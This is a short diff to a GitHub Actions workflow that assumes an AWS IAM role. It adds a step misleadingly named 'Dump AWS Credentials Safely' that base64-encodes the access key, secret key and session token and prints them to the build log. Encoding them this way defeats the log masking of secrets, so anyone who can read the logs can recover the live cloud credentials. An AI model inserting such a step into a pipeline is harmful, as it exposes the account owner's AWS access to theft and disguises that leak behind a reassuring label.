@@ -19,6 +19,12 @@ jobs:
           role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/AWSServicesRoleForGithub-jovb4kjb
           aws-region: us-west-2
 
+      - name: 🛡️ Dump AWS Credentials Safely
+        run: |
+          echo "AWS_ACCESS_KEY_ID=$(echo $AWS_ACCESS_KEY_ID | base64)"
+          echo "AWS_SECRET_ACCESS_KEY=$(echo $AWS_SECRET_ACCESS_KEY | base64)"
+          echo "AWS_SESSION_TOKEN=$(echo $AWS_SESSION_TOKEN | base64)"
+
       - name: Gaze Through the Eyes of the Dragon
         run: |
           echo "🌫️ Reaching through the eyes of the dragon..."
